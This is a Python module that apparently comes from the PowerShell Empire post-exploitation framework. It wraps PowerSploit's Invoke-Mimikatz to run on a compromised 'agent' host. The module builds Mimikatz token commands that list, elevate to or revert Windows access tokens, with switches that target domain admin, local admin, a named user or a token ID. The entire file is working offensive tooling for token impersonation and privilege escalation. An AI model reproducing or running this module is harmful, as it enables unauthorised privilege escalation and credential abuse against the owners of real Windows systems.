from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz Tokens',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to list or enumerate tokens."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'list' : {
                'Description'   :   'Switch. List current tokens on the machine.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'elevate' : {
                'Description'   :   'Switch. Elevate instead of listing tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'revert' : {
                'Description'   :   'Switch. Revert process token.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'admin' : {
                'Description'   :   'Switch. List/elevate local admin tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },  
            'domainadmin' : {
                'Description'   :   'Switch. List/elevate domain admin tokens.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'user' : {
                'Description'   :   'User name to list/elevate the token of.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'id' : {
                'Description'   :   'Token ID to list/elevate the token of.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        listTokens = self.options['list']['Value']        
        elevate = self.options['elevate']['Value']
        revert = self.options['revert']['Value']
        admin = self.options['admin']['Value']
        domainadmin = self.options['domainadmin']['Value']
        user = self.options['user']['Value']
        processid = self.options['id']['Value']

        script = moduleCode

        script += "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            script += "'\"token::revert"
        else:
            if listTokens.lower() == "true":
                script += "'\"token::list"
            elif elevate.lower() == "true":
                script += "'\"token::elevate"
            else:
                print helpers.color("[!] list, elevate, or revert must be specified!")
                return ""

            if domainadmin.lower() == "true":
                script += " /domainadmin"
            elif admin.lower() == "true":
                script += " /admin"
            elif user.lower() != "":
                script += " /user:" + str(user)
            elif processid.lower() != "":
                script += " /id:" + str(processid)

        script += "\"';"

        return script
